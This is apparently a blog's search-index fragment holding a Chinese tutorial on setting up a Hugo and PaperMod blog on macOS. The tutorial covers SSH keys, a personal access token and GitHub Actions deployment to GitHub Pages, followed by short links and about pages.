拉取下来解压是sulv-hugo-papermod文件夹，可以重命名为自己喜欢的名字（BlogSoure） cd BlogSoure git submodule update --init # 表示拉取themes/hugo-PaperMod/下的子模块，里面放的是官方主题 1.3 删除Blog、Public文件下的git文件，这里是原作者的信息，不然推送到自己的GitHub会报错\nrm -rf .git 四、Mac环境下需要的软件 1、安装包管理器Homebrew $ /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; 2、安装Hugo brew install hugo 3、安装git环境 # git环境，Mac下若安装了开发者环境会带有git，没有的话参考以下方式进行安装 brew install git 五、 使用 Hugo 创建博客站点 1、进入刚刚克隆下来的重命名为Blog的文件夹。\ncd BlogSoure 2、在这个文件夹里用 Hugo 创建一个博客网站文件夹。\nhugo new site myblog 3、用 Hugo 创建的网站共会生成一些文件夹文件。 archetypes：存放用 hugo 生成文章的模版 content：存放博客内容页面 layouts：存放自定义网站样式 static：存放静态文件图片等 data：存放其他数据 public：存放Hugo 生成的静态文件 themes：存放主题 config.toml：网站配置文件，建议改成config.yml格式，这样方便阅读与编辑 4、使用Hugo创建一篇文章，目录沿用开源博客目录，后期可以自己修改。\nhugo new posts/blog/xx.md 创建的 Markdown 文件时会套用 archetypes 文件夹中的模版，在空白处用 Markdown 写入文章即可。\n5、启动博客 生成静态文件，用以下命令表示每次生成的public文件都是全新的。\nhugo -F --cleanDestinationDir 进行本地调试\nhugo server -D 运行成功后，可以在 http://localhost:1313/ 中预览博客内容\n六、在Mac上设置GitHub SSH Key 1、 生成 SSH Key 1、点开 GitHub账号头像下的 Settings\n2、找到 Settings 下的 SSH and GPG keys，点击 generating SSH keys。 3、在下一步中选择 Generating a new SSH key and adding it to the ssh-agent 4、选择Mac操作系统，往下滑动页面会看到 GitHub 给出的 Mac下生成SSH Key的方法。 5、打开终端，复制粘贴以命令到终端，把 your_email@example.com 替换成你注册 GitHub 时使用的邮箱。\nssh-keygen -t ed25519 -C \u0026#34;your_email@example.com\u0026#34; 6、一直按 Enter 直到出现以下画面。 7、SSH Key 已经生成成功，接下来把生成的 SSH Key 添加到 ssh-agent。\n2、添加 SSH Key 到 ssh-agent 1、在终端（Terminal）中输入命令，执行完成后终端会给出Agent pid\neval \u0026#34;$(ssh-agent -s)\u0026#34; 2、如果是 macOS Siera 10.12.2 或以上的版本，需要修改 ~/.ssh/config 文件来自动加载密钥到 ssh-agent 和储存 passphrases 到你的钥匙链。\n检查电脑中是否存在 ~/.ssh/config 文件 open ~/.ssh/config 出现以下提示表示不存在该文件，需要创建。 touch ~/.ssh/config 3、用编辑器打开 ~/.ssh/config 文件\nvim ~/.ssh/config 4、在编辑窗口按i建进入插入模式，把以下代码复制粘贴进去，按esc退出编辑模式，然后按住shift+冒号，输入wq，回车保存退出。\nHost * AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_ed25519 5、将 SSH Key 添加到 ssh-agent。你使用的是 Mac Monterey(12.0)及以上版本，可以使用以下命令。\nssh-add --apple-use-keychain ~/.ssh/id_ed25519 如果不是 Mac Monterey(12.0)及以上版本，请用以下命令。\nssh-add -K ~/.ssh/id_ed25519 6、出现 Identity added 即表示添加成功。\n3、 添加 SSH Key 到 GitHub 1、接着，输入以下命令， pbcopy 会复制 SSH Key 内容到剪贴板。\npbcopy \u0026lt; ~/.ssh/id_ed25519.pub 2、再次打开 GitHub Settings 下的 SSH and GPG Key ，点击 New SSH key 3、添加生成的 SSH Key 到 GitHub\n在Title中给这个 SSH Key 命名 Key Type选择 Authentication Key 在Key中 Command+V 粘贴刚刚复制的 SSH Key 添加后点击 Add SSH Key 4、添加完成。\n4、测试 SSH Key 是否添加成功 1、选择一个要用 SSH Key clone 的仓库，复制这个仓库的 SSH 链接。 2、在终端输入以下命令。\ngit clone [ssh-url] 3、clone 成功即代表 SSH Key 添加成功。\n七、发布内容 使用Github Actions功能实现提交源码后自动发布。\n1、生成Actions secrets 1.1 生成Personal access tokens 首先点击github头像在下拉栏里进入Setting-\u0026gt;Developer Settings-\u0026gt;Personal access tokens -\u0026gt; tokens (classic) 1.2 选择Generate new token 1.3 点击Generate token生成token，这个token只有显示一次，并先复制保存该token。\n2、添加ersonal access token 接下来在blog1仓库源码repo中添加上面的personal access token，进入repo的Settings-\u0026gt;Secrets and variable一栏，选择New repository secret。 名称自取，Secret复制上面生成的Personal access tokens。 3、配置actions文件 3.1 在my blog博客根目录新建嵌套的两个文件夹.github/workflows，在workflows里新建一个后缀为.yml的配置文件，名字随意。 将以下配置写进.yml文件里。\nname: deploy # 名字自取 on: push: branches: - main # 这里的意思是当 main分支发生push的时候，运行下面的jobs，这里先改为github-actions jobs: deploy: # 任务名自取 runs-on: ubuntu-latest # 在什么环境运行任务 steps: - uses: actions/checkout@v2 # 引用actions/checkout这个action，与所在的github仓库同名 with: submodules: true # Fetch Hugo themes (true OR recursive) 获取submodule主题 fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo # 步骤名自取 uses: peaceiris/actions-hugo@v2 # hugo官方提供的action，用于在任务环境中获取hugo with: hugo-version: \u0026#39;latest\u0026#39; # 获取最新版本的hugo # extended: true - name: Build Web run: hugo --minify # 使用hugo构建静态网页 - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 # 一个自动发布github pages的action with: # github_token: ${{ secrets.GITHUB_TOKEN }} 该项适用于发布到源码相同repo的情况，不能用于发布到其他repo external_repository: h4m0r/h4m0r.github.io # 发布到哪个repo personal_token: ${{ secrets.PERSONAL_TOKEN }} # 发布到其他repo需要提供上面生成的personal access token publish_dir: ./public # 注意这里指的是要发布哪个文件夹的内容，而不是指发布到目的仓库的什么位置，因为hugo默认生成静态网页到public文件夹，所以这里发布public文件夹里的内容 publish_branch: main # 发布到哪个branch 文件中只需要改external_repository为自己的github page仓库，personal_token: ${{ secrets.XXX }} XXX改成Actions secrets生成的名称。\n4、推送代码到源码仓库 4.1 将myblog文件夹初始化为 Git 仓库，并设置默认主分支名为 main。GitHub 创建仓库默认主分支名是 main， 用 git init 初始化成 main ，再推送给远端仓库，这样才不会报错。\ngit init -b main 4.2 将 public 文件夹关联远程 GitHub Pages 仓库。\ngit remote add origin git@github.com:h4m0r/blog1.git 4.3 推送本地文件到远程仓库。\ngit pull --rebase origin main git add . git commit -m \u0026#34;...(修改的信息)\u0026#34; git push origin main # git push origin main -f 推送完成之后，到github仓库中的Actions中就可以看到运行成功，github pages仓库就会有hugo生成的html文件了，然后你就可以通过 https://h4m0r.github.io 访问你的博客。\n参考文章 1、Windows下使用hugo和Github Pages配置博客\n2、如何用 GitHub Pages + Hugo 搭建个人博客\n3、如何用 GitHub Pages + Hugo 搭建个人博客\n4、hugo博客搭建 | PaperMod主题\n","permalink":"https://hamor.top/posts/blog/mac%E4%B8%8B%E4%BD%BF%E7%94%A8hugo%E5%92%8Cgithubpages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","summary":"\u003ch2 id=\"序章\"\u003e序章\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e一直想用博客的形式记录自己的生活、工作、学习的点滴，从2018年开始用Hexo+NEXT写博客上传到GitHub，后来又断断续续的写了一段时间就荒废了。从今年4月开始看着朋友的博客写的有声有色，除了想用博客来记录之外，觉得自己还是需要将所学的东西沉淀下来，有一个回顾的平台，希望博客能为可能遇到同样问题网友提供帮助。\u003c/p\u003e","title":"Mac下使用hugo和GithubPages搭建个人博客"},{"content":" 👉友链格式 名称： h4mor\u0026rsquo;s Blog 网址： https://www.h4m0r.cn 图标： https://www.h4m0r.cn/img/Q.gif 描述： 一个记录生活、知识、阅读的博客 ","permalink":"https://hamor.top/links/","summary":"\u003cbr/\u003e\n\u003cbr/\u003e\n\u003cbr/\u003e\n\u003cbr/\u003e\n\u003cbr/\u003e\n\u003cdiv style=\"font-size: 20px;\" class=\"youlian\"\u003e👉友链格式\u003c/div\u003e\n\u003cdiv style=\"font-size: 16px;\"\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e名称：\u003c/td\u003e\n          \u003ctd\u003eh4mor\u0026rsquo;s Blog\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e网址：\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.h4m0r.cn\"\u003ehttps://www.h4m0r.cn\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e图标：\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.h4m0r.cn/img/Q.gif\"\u003ehttps://www.h4m0r.cn/img/Q.gif\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e描述：\u003c/td\u003e\n          \u003ctd\u003e一个记录生活、知识、阅读的博客\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003c/div\u003e\n\u003cbr/\u003e\n\u003c!-- \u003cdiv style=\"font-size: 20px;\"\u003e👉友链申请要求\u003c/div\u003e\n\n\u003e 秉承互换友链原则、文章定期更新、网站在工信部备案、不能有太多广告、个人描述字数控制在15字内\n\n\u003cbr/\u003e --\u003e\n\u003c!-- \u003cdiv style=\"font-size: 20px;\"\u003e👉Hugo博客交流群\u003c/div\u003e\n\n\u003e 787018782 --\u003e","title":"友链"},{"content":"关于我\n英文名: H4m0r 职业: xxx 运动: 跑步、乒乓球、篮球 ","permalink":"https://hamor.top/about/","summary":"\u003cp style=\"font-size: 25px;\"\u003e关于我\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e英文名:\u003c/td\u003e\n          \u003ctd\u003eH4m0r\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e职业:\u003c/td\u003e\n          \u003ctd\u003exxx\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e运动:\u003c/td\u003e\n          \u003ctd\u003e跑步、乒乓球、篮球\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"关于"}]